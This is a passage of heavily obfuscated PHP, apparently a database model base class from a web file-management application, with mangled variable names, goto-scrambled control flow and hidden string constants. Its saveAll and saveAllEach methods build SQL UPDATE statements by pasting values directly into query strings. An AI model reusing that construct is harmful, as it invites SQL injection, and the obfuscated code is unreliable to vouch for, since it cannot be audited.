$eõã‚¨Ô¢– = $Cæİİî†; if (!is_array($Cæİİî†)) { $eõã‚¨Ô¢– = array($Cæİİî†); } foreach ($eõã‚¨Ô¢– as $a×¿ÏË¤´) { $CŠá¹÷óÒÍ = $this->cacheKeyMake($a‹Ğ©‚‘‘, $a×¿ÏË¤´); Cache::remove($CŠá¹÷óÒÍ); } } private function cacheKeyMake($Fç‚íµİ¶, $D¼¹Úø¡¬§) { $Fñ¢¬Óîæµ =& $_SERVER[ºÖÙÂŒäÉê‡]; return get_class($this) . $Fñ¢¬Óîæµ[70] . $Fç‚íµİ¶ . $Fñ¢¬Óîæµ[353] . $D¼¹Úø¡¬§; } protected function selectPage($F¹­ÁÇ…ì˜ = 200, $Cã²ˆæèÍ = 1) { goto A…½à¶£§›; F‹Ò·ÂÕ…Š: if ($Aˆî©‡çâª == 1) { $E™×´Ù´•Š = count($F‹‹Şó˜ø); } $c¹æì•¡¨ = array($eÕ°Ê›àÚ¡[356] => array($eÕ°Ê›àÚ¡[357] => $E™×´Ù´•Š, $eÕ°Ê›àÚ¡[354] => $F¹­ÁÇ…ì˜, $eÕ°Ê›àÚ¡[345] => $Cã²ˆæèÍ, $eÕ°Ê›àÚ¡[358] => $Aˆî©‡çâª), $eÕ°Ê›àÚ¡[359] => $F‹‹Şó˜ø ? $F‹‹Şó˜ø : array()); return $c¹æì•¡¨; goto Dùî§ÌñõÈ; F‚Ğ•“¥òÏ: $E½ŸÕ¯Ê˜ = $b¯«ÜÉ²Ó; $E½ŸÕ¯Ê˜[$eÕ°Ê›àÚ¡[355]] = array(); $this->optionsValue($E½ŸÕ¯Ê˜); goto b¸Ú „Ùµä; b¸Ú „Ùµä: $E™×´Ù´•Š = intval($this->count()); $F¹­ÁÇ…ì˜ = intval($F¹­ÁÇ…ì˜); $F¹­ÁÇ…ì˜ = $F¹­ÁÇ…ì˜ <= 5 ? 5 : ($F¹­ÁÇ…ì˜ >= $Fâ“¢…Å±¿ ? $Fâ“¢…Å±¿ : $F¹­ÁÇ…ì˜); goto BÂ°‚³ºâ; EÕ¸˜ÙÁ÷†: $this->optionsValue($b¯«ÜÉ²Ó); $F‹‹Şó˜ø = $this->page($Cã²ˆæèÍ, $F¹­ÁÇ…ì˜)->select(); $F‹‹Şó˜ø = is_array($F‹‹Şó˜ø) ? $F‹‹Şó˜ø : array(); goto F‹Ò·ÂÕ…Š; bÖíŸº‹¿: $Fâ“¢…Å±¿ = 4000; $F¹­ÁÇ…ì˜ = isset($in[$eÕ°Ê›àÚ¡[354]]) ? $in[$eÕ°Ê›àÚ¡[354]] : $F¹­ÁÇ…ì˜; if ($F¹­ÁÇ…ì˜ === -1) { unset($in[$eÕ°Ê›àÚ¡[354]]); $Fâ“¢…Å±¿ = 100000000; $F¹­ÁÇ…ì˜ = $Fâ“¢…Å±¿; } goto F‚Ğ•“¥òÏ; A…½à¶£§›: $eÕ°Ê›àÚ¡ =& $_SERVER[ºÖÙÂŒäÉê‡]; global $in; $b¯«ÜÉ²Ó = $this->optionsValue(); goto bÖíŸº‹¿; BÂ°‚³ºâ: $Aˆî©‡çâª = ceil($E™×´Ù´•Š / $F¹­ÁÇ…ì˜); $Cã²ˆæèÍ = intval(isset($in[$eÕ°Ê›àÚ¡[345]]) ? $in[$eÕ°Ê›àÚ¡[345]] : $Cã²ˆæèÍ); $Cã²ˆæèÍ = $Cã²ˆæèÍ <= 1 ? 1 : ($Cã²ˆæèÍ >= $Aˆî©‡çâª ? $Aˆî©‡çâª : $Cã²ˆæèÍ); goto EÕ¸˜ÙÁ÷†; Dùî§ÌñõÈ: } protected function checkLength($eÃ‚£ê‘Ôä, $fÂÁç‚È = 0, $C³›Ó‘×î“ = '') { $C§öŸÚ³å =& $_SERVER[ºÖÙÂŒäÉê‡]; $fÂÁç‚È = $fÂÁç‚È ? $fÂÁç‚È : 65536; if (!$eÃ‚£ê‘Ôä || strlen($eÃ‚£ê‘Ôä) < $fÂÁç‚È) { return; } $C³›Ó‘×î“ = $C³›Ó‘×î“ ? $C³›Ó‘×î“ . $C§öŸÚ³å[67] : $C§öŸÚ³å[33]; show_json($C³›Ó‘×î“ . LNG($C§öŸÚ³å[360]) . "\x28{$fÂÁç‚È}\51", !1); } protected function metaSet($Bš™¼ãİº÷, $F±†çµæ•à = null, $D„Ú‘³İÜ = null) { goto E¾â†Ñ¼™æ; e®³…ÎçÏÂ: $BÍöù›ä->where(array($fŸŞÓ±×È => $Bš™¼ãİº÷))->addAll($cùêÔÕ£Ì, array(), !0); return !0; goto bˆØ¿ì„éç; E¶ëººè¿„: if (is_null($F±†çµæ•à)) { return $BÍöù›ä->where(array($fŸŞÓ±×È => $Bš™¼ãİº÷))->delete(); } if (is_null($D„Ú‘³İÜ)) { return $BÍöù›ä->where($F‰Ú…§‘Ÿ)->delete(); } $fÜÅßÏ®ÌË = is_array($F±†çµæ•à) ? $F±†çµæ•à : array(); goto CŒ•Å—­º—; Aš ˆ¦…¨: $fœ˜‡°ç½Ç = $this->tableMeta[$A°¢„´œŠÃ[362]]; $BÍöù›ä = Model($fœ˜‡°ç½Ç); $F‰Ú…§‘Ÿ = array($fŸŞÓ±×È => $Bš™¼ãİº÷, $A°¢„´œŠÃ[363] => $F±†çµæ•à); goto E¶ëººè¿„; E¾â†Ñ¼™æ: $A°¢„´œŠÃ =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!$this->tableMeta) { return !1; } $fŸŞÓ±×È = $this->tableMeta[$A°¢„´œŠÃ[361]]; goto Aš ˆ¦…¨; CŒ•Å—­º—: if (is_string($F±†çµæ•à)) { $fÜÅßÏ®ÌË[$F±†çµæ•à] = $D„Ú‘³İÜ; } $cùêÔÕ£Ì = array(); foreach ($fÜÅßÏ®ÌË as $fˆõĞ¡Ñ½â => $fì½–ìÇØÔ) { $this->checkLength($fì½–ìÇØÔ, !1, $fœ˜‡°ç½Ç . $A°¢„´œŠÃ[4] . $fˆõĞ¡Ñ½â); $cùêÔÕ£Ì[] = array($fŸŞÓ±×È => $Bš™¼ãİº÷, $A°¢„´œŠÃ[89] => $fˆõĞ¡Ñ½â, $A°¢„´œŠÃ[364] => $fì½–ìÇØÔ); } goto e®³…ÎçÏÂ; bˆØ¿ì„éç: } public function metaGet($aôË¾ŒÚ†§) { goto ašÃ½ÚğÄ—; FÄ¹½´”Šƒ: $dÆ¹ˆîÑ Œ = array_to_keyvalue($dÆ¹ˆîÑ Œ, $CÔí…ì ¿¶[89], $CÔí…ì ¿¶[364]); return $dÆ¹ˆîÑ Œ; goto aëîäïÓİ–; ašÃ½ÚğÄ—: $CÔí…ì ¿¶ =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!$this->tableMeta) { return array(); } $Eºê†¦†•Ñ = $this->tableMeta[$CÔí…ì ¿¶[361]]; goto D·º‰ÒŒ£ê; D·º‰ÒŒ£ê: $fá—´ãÙÌ = Model($this->tableMeta[$CÔí…ì ¿¶[362]]); $bõÛÚÇ‡Æˆ = array($Eºê†¦†•Ñ => $aôË¾ŒÚ†§); $dÆ¹ˆîÑ Œ = $fá—´ãÙÌ->field($CÔí…ì ¿¶[365])->where($bõÛÚÇ‡Æˆ)->select(); goto FÄ¹½´”Šƒ; aëîäïÓİ–: } private function checkDataAutoHas($CªÉ±‘÷ß) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $BšÕÇá–éÑ) { if (in_array($CªÉ±‘÷ß, explode($_SERVER[ºÖÙÂŒäÉê‡][47], $BšÕÇá–éÑ[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$B¡¯àÌÁì¦, $D·ÓïäÇƒ) { $B©·‘øµÛñ =& $_SERVER[ºÖÙÂŒäÉê‡]; foreach ($this->dataAuto as $d¼’ì»– Ú) { $C•»©™ÅÈ = $d¼’ì»– Ú[0]; if (!in_array($D·ÓïäÇƒ, explode($B©·‘øµÛñ[47], $d¼’ì»– Ú[2]))) { continue; } switch (trim($d¼’ì»– Ú[3])) { case $B©·‘øµÛñ[314]: case $B©·‘øµÛñ[315]: $bíª„«¼Šõ = $d¼’ì»– Ú[1]; $B‘¦Å’¬­È = isset($d¼’ì»– Ú[4]) ? (array) $d¼’ì»– Ú[4] : array(); if ($bíª„«¼Šõ == $B©·‘øµÛñ[196] && array_key_exists($C•»©™ÅÈ, $B¡¯àÌÁì¦)) { if (!$B¡¯àÌÁì¦[$C•»©™ÅÈ]) { unset($B¡¯àÌÁì¦[$C•»©™ÅÈ]); } break; } if (isset($B¡¯àÌÁì¦[$C•»©™ÅÈ])) { array_unshift($B‘¦Å’¬­È, $B¡¯àÌÁì¦[$C•»©™ÅÈ]); } if ($B©·‘øµÛñ[314] == $d¼’ì»– Ú[3]) { $B¡¯àÌÁì¦[$C•»©™ÅÈ] = call_user_func_array($bíª„«¼Šõ, $B‘¦Å’¬­È); } else { $B¡¯àÌÁì¦[$C•»©™ÅÈ] = call_user_func_array(array(&$this, $bíª„«¼Šõ), $B‘¦Å’¬­È); } break; case $B©·‘øµÛñ[266]: $B¡¯àÌÁì¦[$C•»©™ÅÈ] = $B¡¯àÌÁì¦[$d¼’ì»– Ú[1]]; break; case $B©·‘øµÛñ[287]: if (isset($B¡¯àÌÁì¦[$C•»©™ÅÈ]) && !is_string($B¡¯àÌÁì¦[$C•»©™ÅÈ])) { $B¡¯àÌÁì¦[$C•»©™ÅÈ] = json_encode_force($B¡¯àÌÁì¦[$C•»©™ÅÈ]); } break; case $B©·‘øµÛñ[316]: if ($B¡¯àÌÁì¦[$C•»©™ÅÈ] === $B©·‘øµÛñ[33]) { unset($B¡¯àÌÁì¦[$C•»©™ÅÈ]); } break; case $B©·‘øµÛñ[317]: $B¡¯àÌÁì¦[$C•»©™ÅÈ] = $d¼’ì»– Ú[1]; default: break; } } if ($D·ÓïäÇƒ == $B©·‘øµÛñ[349]) { $A‡ÔçÇäŸ = strtolower($this->db->getDbType()); if (strpos($A‡ÔçÇäŸ, $B©·‘øµÛñ[9]) !== 0) { return; } $e“‰ÒŠ¾† = $this->field(!0)->fields; $EğïÖ§ñçÁ = $e“‰ÒŠ¾†[$B©·‘øµÛñ[245]]; if (isset($e“‰ÒŠ¾†[$B©·‘øµÛñ[244]])) { unset($EğïÖ§ñçÁ[$e“‰ÒŠ¾†[$B©·‘øµÛñ[244]]]); } foreach ($EğïÖ§ñçÁ as $C‹„„»ŞŒ => $D·ÓïäÇƒ) { if (!isset($B¡¯àÌÁì¦[$C‹„„»ŞŒ])) { $B¡¯àÌÁì¦[$C‹„„»ŞŒ] = $B©·‘øµÛñ[33]; } } } } private function dataAfterFilter(&$e ºğò»ì) { $C˜âÆ×ä¬ =& $_SERVER[ºÖÙÂŒäÉê‡]; foreach ($this->dataAuto as $aÇ¾–Ü“Ş¡) { $D§Ø„Ë©Ñö = $aÇ¾–Ü“Ş¡[0]; if (!in_array($C˜âÆ×ä¬[351], explode($C˜âÆ×ä¬[47], $aÇ¾–Ü“Ş¡[2]))) { continue; } if (!isset($e ºğò»ì[$D§Ø„Ë©Ñö])) { continue; } switch (trim($aÇ¾–Ü“Ş¡[3])) { case $C˜âÆ×ä¬[314]: case $C˜âÆ×ä¬[315]: $d¸ÍÚ©œ³ç = isset($aÇ¾–Ü“Ş¡[4]) ? (array) $aÇ¾–Ü“Ş¡[4] : array(); array_unshift($d¸ÍÚ©œ³ç, $e ºğò»ì[$D§Ø„Ë©Ñö]); if ($C˜âÆ×ä¬[314] == $aÇ¾–Ü“Ş¡[3]) { $e ºğò»ì[$D§Ø„Ë©Ñö] = call_user_func_array($aÇ¾–Ü“Ş¡[1], $d¸ÍÚ©œ³ç); } else { $e ºğò»ì[$D§Ø„Ë©Ñö] = call_user_func_array(array(&$this, $aÇ¾–Ü“Ş¡[1]), $d¸ÍÚ©œ³ç); } break; case $C˜âÆ×ä¬[266]: $e ºğò»ì[$D§Ø„Ë©Ñö] = $e ºğò»ì[$aÇ¾–Ü“Ş¡[1]]; break; case $C˜âÆ×ä¬[287]: $cŠ÷›‘‡İæ = $e ºğò»ì[$D§Ø„Ë©Ñö]; $e ºğò»ì[$D§Ø„Ë©Ñö] = json_decode($cŠ÷›‘‡İæ, !0); if (is_null($e ºğò»ì[$D§Ø„Ë©Ñö])) { $e ºğò»ì[$D§Ø„Ë©Ñö] = $cŠ÷›‘‡İæ; } break; case $C˜âÆ×ä¬[316]: if ($e ºğò»ì[$D§Ø„Ë©Ñö] === $C˜âÆ×ä¬[33]) { unset($e ºğò»ì[$D§Ø„Ë©Ñö]); } break; case $C˜âÆ×ä¬[317]: $e ºğò»ì[$D§Ø„Ë©Ñö] = $aÇ¾–Ü“Ş¡[1]; default: break; } } } public function saveAll($dÌºŒºõ÷Æ) { goto C”á«ñĞÆé; A“ãßÀ¾´®: $this->chunkEventSet(); goto aìÖ“ÃÕ¯¥; a™´ÓÓ°„: $C†ÈŒ™Óàè = array(); $C…ç˜ñ‡Ï = count($dÌºŒºõ÷Æ); for ($f‹ö„„Û­÷ = 0; $f‹ö„„Û­÷ < $C…ç˜ñ‡Ï; $f‹ö„„Û­÷++) { $Cæ™Øòƒœ = $dÌºŒºõ÷Æ[$f‹ö„„Û­÷]; if (!is_array($Cæ™Øòƒœ) || count($Cæ™Øòƒœ) != 4) { continue; } $e’ª…¸Ÿä§ = "\125\x50\x44\101\124\105\40{$bù¬ÉÌÓ°¢}\40\x53\x45\124\x20{$Cæ™Øòƒœ[2]}\x20\75\x20\x43\101\123\x45\40{$Cæ™Øòƒœ[0]}\x20\12"; if ($b¸‰µµÇ‘Œ == 0) { $BÎ”ùÒˆšø = $e’ª…¸Ÿä§; } $C†ÈŒ™Óàè[] = $d¦³ƒÓ¨“¢[112] . $Cæ™Øòƒœ[1] . $d¦³ƒÓ¨“¢[112]; $b¸‰µµÇ‘Œ++; $BÎ”ùÒˆšø .= "\x20\127\x48\x45\x4e\x20\x27{$Cæ™Øòƒœ[1]}\47\40\124\110\105\x4e\40\47{$Cæ™Øòƒœ[3]}\x27\40\xa"; if ($b¸‰µµÇ‘Œ == $b™…˜ÏÂ«« || $f‹ö„„Û­÷ == $C…ç˜ñ‡Ï - 1) { goto dë¾—²•Šº; F‘¬¹”¾ƒ’: $b¸‰µµÇ‘Œ = 0; $BÎ”ùÒˆšø = $e’ª…¸Ÿä§; $this->chunkEventCheck(count($C†ÈŒ™Óàè)); goto BÉòÏ¢Çí›; BÉòÏ¢Çí›: $C†ÈŒ™Óàè = array(); goto a®ÍØ¡ù; dë¾—²•Šº: $F»ƒÕå¼Èğ = implode($d¦³ƒÓ¨“¢[47], $C†ÈŒ™Óàè); $BÎ”ùÒˆšø .= "\40\105\116\x44\x20\40\x57\x48\x45\122\x45\x20{$Cæ™Øòƒœ[0]}\x20\111\116\40\x28{$F»ƒÕå¼Èğ}\51\40"; $this->execute($BÎ”ùÒˆšø); goto F‘¬¹”¾ƒ’; a®ÍØ¡ù: } } goto A“ãßÀ¾´®; C”á«ñĞÆé: $d¦³ƒÓ¨“¢ =& $_SERVER[ºÖÙÂŒäÉê‡]; $bù¬ÉÌÓ°¢ = $this->tablePrefix . $this->tableName; $b™…˜ÏÂ«« = self::SQL_WHERE_IN_CHUNK; goto Fæ°‘ç£íÍ; Fæ°‘ç£íÍ: $dÌºŒºõ÷Æ = is_array($dÌºŒºõ÷Æ) ? $dÌºŒºõ÷Æ : array(); $BÎ”ùÒˆšø = $d¦³ƒÓ¨“¢[366]; $b¸‰µµÇ‘Œ = 0; goto a™´ÓÓ°„; aìÖ“ÃÕ¯¥: } public function saveAllEach($B¢Õ¾ŒÍì) { $cîÅãµÂ’ä =& $_SERVER[ºÖÙÂŒäÉê‡]; $a÷õå‹™© = $this->tablePrefix . $this->tableName; foreach ($B¢Õ¾ŒÍì as $dÃŸ…«¯©) { if (!is_array($dÃŸ…«¯©) || count($dÃŸ…«¯©) != 4) { continue; } $E¯¯¹„ò¤¦ = $dÃŸ…«¯©[0] . $cîÅãµÂ’ä[367] . $dÃŸ…«¯©[1] . $cîÅãµÂ’ä[112]; $c‹ÍÏ‚‡ñì = $dÃŸ…«¯©[2] . $cîÅãµÂ’ä[367] . $dÃŸ…«¯©[3] . $cîÅãµÂ’ä[112]; $c‚ÛÎ…´  = "\165\x70\144\141\164\145\x20{$a÷õå‹™©}\x20\163\145\164\x20{$c‹ÍÏ‚‡ñì}\x20\167\x68\x65\162\x65\x20{$E¯¯¹„ò¤¦}\x3b"; $this->execute($c‚ÛÎ…´ ); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($fŠÈÄ¬ˆ×« = false, $bÙŸ¡ÎÇ¡ö = false) { $this->_chunkEvent = $fŠÈÄ¬ˆ×«; $this->_chunkEventParam = $bÙŸ¡ÎÇ¡ö; } private function chunkEventCheck($FÖŠÄ”¬ù) { if (!$this->_chunkEvent) { return; } $b”ª‘œŒ›Ñ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $b”ª‘œŒ›Ñ[$_SERVER[ºÖÙÂŒäÉê‡][368]] = $FÖŠÄ”¬ù; Hook::trigger($this->_chunkEvent, $b”ª‘œŒ›Ñ); } public function addAll($dîóà¬Ó», $E¦Ş¢¿‰¿Å = array(), $AŞ±©šî±í = false) { goto FŞØî˜ŒÄ…; cÇã¯Ï»ÔÌ: if (empty($dîóà¬Ó»)) { $this->error = think_lang($f‡¼·í™Û[264]); return !1; } $E¦Ş¢¿‰¿Å = $this->_parseOptions($E¦Ş¢¿‰¿Å); foreach ($dîóà¬Ó» as $DéóêªƒêÏ => $C’Ç°ƒÖî) { $dîóà¬Ó»[$DéóêªƒêÏ] = $this->_facade($C’Ç°ƒÖî); $this->_beforeInsert($dîóà¬Ó»[$DéóêªƒêÏ], $E¦Ş¢¿‰¿Å); } goto FÄ¶µ×…Şå; FÄ¶µ×…Şå: if (method_exists($this->db, $f‡¼·í™Û[265])) { for ($DÛï­É‘ôÓ = 0; $DÛï­É‘ôÓ < count($dîóà¬Ó»); $DÛï­É‘ôÓ += $b°¥°¯) { $AŸ¾¥÷Š…¾ = array_slice($dîóà¬Ó», $DÛï­É‘ôÓ, $b°¥°¯); if (!is_array($AŸ¾¥÷Š…¾) || count($AŸ¾¥÷Š…¾) == 0) { break; } $fæÍ˜Ó¯ = $this->db->insertAll($AŸ¾¥÷Š…¾, $E¦Ş¢¿‰¿Å, $AŞ±©šî±í); $this->chunkEventCheck(count($AŸ¾¥÷Š…¾)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($dîóà¬Ó» as $DéóêªƒêÏ => $C’Ç°ƒÖî) { $fæÍ˜Ó¯ = $this->db->insert($C’Ç°ƒÖî, $E¦Ş¢¿‰¿Å, $AŞ±©šî±í); } $this->commit(); } if (!1 !== $fæÍ˜Ó¯) { $D‹‰Ûõ©Ô = $this->getLastInsID(); if ($D‹‰Ûõ©Ô) { return $D‹‰Ûõ©Ô; } } return $fæÍ˜Ó¯; goto f‘ÏôÃî¦; FŞØî˜ŒÄ…: $f‡¼·í™Û =& $_SERVER[ºÖÙÂŒäÉê‡]; ignore_timeout(); $b°¥°¯ = self::SQL_WHERE_IN_CHUNK; goto cÇã¯Ï»ÔÌ; f‘ÏôÃî¦: } public function save($EØŒèƒ† = '', $d¥¿ÈøØô = array()) { goto EÁßŠÌ¡±Á; fœÖÄî‘óì: for ($B‡ØØœ¥ï© = 0; $B‡ØØœ¥ï© < $fóˆ ¼‹Ò; $B‡ØØœ¥ï© += $CµšÃÕ•˜à) { $Aİê¸ÔÉ„¼ = array_slice($e¸½“††»Ø, $B‡ØØœ¥ï©, $CµšÃÕ•˜à); if (!is_array($Aİê¸ÔÉ„¼) || count($Aİê¸ÔÉ„¼) == 0) { break; } $d´ˆóãÛ÷¾[$EŒ‡¥”Áœ¢[268]][$Eˆ¯ò±‚°†][1] = $Aİê¸ÔÉ„¼; $this->optionsValue($d´ˆóãÛ÷¾); $Fà‡«¤«Ôƒ += parent::save($EØŒèƒ†, $d¥¿ÈøØô); $this->chunkEventCheck(count($Aİê¸ÔÉ„¼)); } $this->chunkEventSet(); return $Fà‡«¤«Ôƒ; goto CÒ¨©ºÅ; F„öÈÁÆ×Ì: $Eˆ¯ò±‚°† = $this->findWhereField($d´ˆóãÛ÷¾); if (!$Eˆ¯ò±‚°†) { return parent::save($EØŒèƒ†, $d¥¿ÈøØô); } $Fà‡«¤«Ôƒ = 0; goto dØÄ„îµø¾; dØÄ„îµø¾: $e¸½“††»Ø = $d´ˆóãÛ÷¾[$EŒ‡¥”Áœ¢[268]][$Eˆ¯ò±‚°†][1]; $e¸½“††»Ø = is_array($e¸½“††»Ø) ? $e¸½“††»Ø : array(); $fóˆ ¼‹Ò = count($e¸½“††»Ø); goto fœÖÄî‘óì; EÁßŠÌ¡±Á: $EŒ‡¥”Áœ¢ =& $_SERVER[ºÖÙÂŒäÉê‡]; $CµšÃÕ•˜à = self::SQL_WHERE_IN_CHUNK; $d´ˆóãÛ÷¾ = $this->optionsValue(); goto F„öÈÁÆ×Ì; CÒ¨©ºÅ: } public function add($céÅÊ¯À‡ó = '', $BùÑ… ™¯õ = array(), $A’Œá¹×äÚ = false) { if ($this->addTaskStatus && is_array($céÅÊ¯À‡ó)) { $this->addTaskData[] = $céÅÊ¯À‡ó; return; } return parent::add($céÅÊ¯À‡ó, $BùÑ… ™¯õ, $A’Œá¹×äÚ); } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($d‹‹Ê£ğÑ = array()) { goto EòÅè›™—‹; aƒÇî®ôØ¬: $d¸µøØ‚–Ò = is_array($d¸µøØ‚–Ò) ? $d¸µøØ‚–Ò : array(); $fœŸ£±™ŠÏ = null; for ($dôÎã‡ïÀÎ = 0; $dôÎã‡ïÀÎ < count($d¸µøØ‚–Ò); $dôÎã‡ïÀÎ += $d‰·¢¥ ) { $fÇÌ§¨š¦Š = array_slice($d¸µøØ‚–Ò, $dôÎã‡ïÀÎ, $d‰·¢¥ ); if (!is_array($fÇÌ§¨š¦Š) || count($fÇÌ§¨š¦Š) == 0) { break; } $eÓî²™±[$d©Š³¸á¬Ø[268]][$D¨çÎ¡ÆÀ˜][1] = $fÇÌ§¨š¦Š; $this->optionsValue($eÓî²™±); $bÛ‡¸†ñÏÀ = parent::select($d‹‹Ê£ğÑ); if (!$bÛ‡¸†ñÏÀ) { continue; } if (is_null($fœŸ£±™ŠÏ)) { $fœŸ£±™ŠÏ = array(); } $fœŸ£±™ŠÏ = array_merge($fœŸ£±™ŠÏ, $bÛ‡¸†ñÏÀ); } goto dªŞÊä«î‹; E°êÏ‡ô: $D¨çÎ¡ÆÀ˜ = $this->findWhereField($eÓî²™±); if (!$D¨çÎ¡ÆÀ˜ || isset($eÓî²™±[$d©Š³¸á¬Ø[285]]) || isset($eÓî²™±[$d©Š³¸á¬Ø[345]])) { return parent::select($d‹‹Ê£ğÑ); } $d¸µøØ‚–Ò = $eÓî²™±[$d©Š³¸á¬Ø[268]][$D¨çÎ¡ÆÀ˜][1]; goto aƒÇî®ôØ¬; EòÅè›™—‹: $d©Š³¸á¬Ø =& $_SERVER[ºÖÙÂŒäÉê‡]; $d‰·¢¥  = self::SQL_WHERE_IN_CHUNK; $eÓî²™± = $this->optionsValue(); goto E°êÏ‡ô; dªŞÊä«î‹: return $fœŸ£±™ŠÏ; goto EĞÊÖÈ©÷Î; EĞÊÖÈ©÷Î: } public function delete($c›Œè¤ëôÖ = array()) { goto fî”ÌçËƒÃ; C„íƒÛ’Â‡: $d…À‚•±÷ß = $eõŒçØìˆ[$bç¹”Ğµ[268]][$b¹Ùœ ˆ¬©][1]; $d…À‚•±÷ß = is_array($d…À‚•±÷ß) ? $d…À‚•±÷ß : array(); for ($BƒÀß”¡ËŸ = 0; $BƒÀß”¡ËŸ < count($d…À‚•±÷ß); $BƒÀß”¡ËŸ += $DŠ…ÈÑ½›Û) { $aßØ½ƒÜĞ÷ = array_slice($d…À‚•±÷ß, $BƒÀß”¡ËŸ, $DŠ…ÈÑ½›Û); if (!is_array($aßØ½ƒÜĞ÷) || count($aßØ½ƒÜĞ÷) == 0) { break; } $eõŒçØìˆ[$bç¹”Ğµ[268]][$b¹Ùœ ˆ¬©][1] = $aßØ½ƒÜĞ÷; $this->optionsValue($eõŒçØìˆ); $D‰ª£±¶Ëˆ += parent::delete($c›Œè¤ëôÖ); } goto bÈœ¶ã¶; bÈœ¶ã¶: return $D‰ª£±¶Ëˆ; goto cªŒ—·çªç; Dø£ÒÒƒ´: $b¹Ùœ ˆ¬© = $this->findWhereField($eõŒçØìˆ); if (!$b¹Ùœ ˆ¬©) { return parent::delete($c›Œè¤ëôÖ); } $D‰ª£±¶Ëˆ = 0; goto C„íƒÛ’Â‡; fî”ÌçËƒÃ: $bç¹”Ğµ =& $_SERVER[ºÖÙÂŒäÉê‡]; $DŠ…ÈÑ½›Û = self::SQL_WHERE_IN_CHUNK; $eõŒçØìˆ = $this->optionsValue(); goto Dø£ÒÒƒ´; cªŒ—·çªç: } private function findWhereField($eÕ¼êî ˜è) { $dììİÑ =& $_SERVER[ºÖÙÂŒäÉê‡]; $c×ÔÖ¹¬· = self::SQL_WHERE_IN_CHUNK; if (!is_array($eÕ¼êî ˜è) || !is_array($eÕ¼êî ˜è[$dììİÑ[268]])) { return !1; } foreach ($eÕ¼êî ˜è[$dììİÑ[268]] as $D‘ò‡Ã => $C°åí•ã»…) { if (is_array($C°åí•ã»…) && isset($C°åí•ã»…[0]) && is_string($C°åí•ã»…[0]) && strtolower($C°åí•ã»…[0]) == $dììİÑ[7] && is_array($C°åí•ã»…[1]) && count($C°åí•ã»…[1]) > $c×ÔÖ¹¬·) { ignore_timeout(); return $D‘ò‡Ã; } } return !1; } } class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\171\163\x74\x65\155\x4f\x70\x74\151\157\156"; public $field = array(); public function listData($C¯È˜È¦² = false, $A·à·×õ²¿ = "\155\x6f\144\151\146\x79\124\x69\155\145", $dÆªè®Ãİ£ = false) { $B™…–Ù¿•‹ = Model($this->modelType)->get(!1, $this->optionType, !0); if (!$B™…–Ù¿•‹) { return $C¯È˜È¦² ? null : array(); } if (!$C¯È˜È¦²) { $B™…–Ù¿•‹ = array_filter(array_values($B™…–Ù¿•‹)); return array_sort_by($B™…–Ù¿•‹, $A·à·×õ²¿, $dÆªè®Ãİ£); } return $B™…–Ù¿•‹[$_SERVER[ºÖÙÂŒäÉê‡][369] . $C¯È˜È¦²]; } public function insert($bÑ¿†˜Ÿ¹³) { goto E¨¬…‚—†È; a¢‡ÒÅšÅë: $bÑ¿†˜Ÿ¹³[$A†ŞÇèŞ‰ [106]] = time(); Model($this->modelType)->set($A†ŞÇèŞ‰ [370], $fŞ›êáßäó, $this->optionType . $A†ŞÇèŞ‰ [371]); Model($this->modelType)->set($A†ŞÇèŞ‰ [369] . $fŞ›êáßäó, $bÑ¿†˜Ÿ¹³, $this->optionType); goto dóëñ¸·ô‚; f˜¾‡š…²Ù: $fŞ›êáßäó = $fŞ›êáßäó ? $fŞ›êáßäó : 0; $bÑ¿†˜Ÿ¹³[$A†ŞÇèŞ‰ [372]] = ++$fŞ›êáßäó; $bÑ¿†˜Ÿ¹³[$A†ŞÇèŞ‰ [193]] = time(); goto a¢‡ÒÅšÅë; E¨¬…‚—†È: $A†ŞÇèŞ‰  =& $_SERVER[ºÖÙÂŒäÉê‡]; $bÑ¿†˜Ÿ¹³ = array_field_key($bÑ¿†˜Ÿ¹³, $this->field); $fŞ›êáßäó = Model($this->modelType)->get($A†ŞÇèŞ‰ [370], $this->optionType . $A†ŞÇèŞ‰ [371]); goto f˜¾‡š…²Ù; dóëñ¸·ô‚: return $fŞ›êáßäó; goto Bîé²…ÎÎí; Bîé²…ÎÎí: } public function update($bŸÕ¦™ÁÕ–, $c‡ÛµøŞ§ï) { goto e…Ù‰åãğ; e…Ù‰åãğ: $añºå÷¤Œê =& $_SERVER[ºÖÙÂŒäÉê‡]; $c‡ÛµøŞ§ï = array_field_key($c‡ÛµøŞ§ï, $this->field); $a¯Ş”ÛÍÍ = $this->listData($bŸÕ¦™ÁÕ–); goto c¡´°ÀÚÆ; c¡´°ÀÚÆ: if (!$a¯Ş”ÛÍÍ) { return !1; } $c‡ÛµøŞ§ï = array_merge($a¯Ş”ÛÍÍ, $c‡ÛµøŞ§ï); $c‡ÛµøŞ§ï[$añºå÷¤Œê[106]] = time(); goto BŒµ•®Æ®Ì; BŒµ•®Æ®Ì: return Model($this->modelType)->set($añºå÷¤Œê[369] . $bŸÕ¦™ÁÕ–, $c‡ÛµøŞ§ï, $this->optionType); goto Bàë±™…¿; Bàë±™…¿: } public function remove($aÆ¸­£§Ê˜) { return Model($this->modelType)->remove($_SERVER[ºÖÙÂŒäÉê‡][369] . $aÆ¸­£§Ê˜, $this->optionType); } public function clear() { $bòòéÀ…º³ =& $_SERVER[ºÖÙÂŒäÉê‡]; Model($this->modelType)->remove($bòòéÀ…º³[370], $this->optionType . $bòòéÀ…º³[371]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($B¦Ğ‚¾–ˆç, $föŞœê£¥) { if (!$föŞœê£¥) { return !1; } $CÚ’ö¥»ˆ = $this->listData(); $CÚ’ö¥»ˆ = array_to_keyvalue($CÚ’ö¥»ˆ, $B¦Ğ‚¾–ˆç); return isset($CÚ’ö¥»ˆ[$föŞœê£¥]) ? 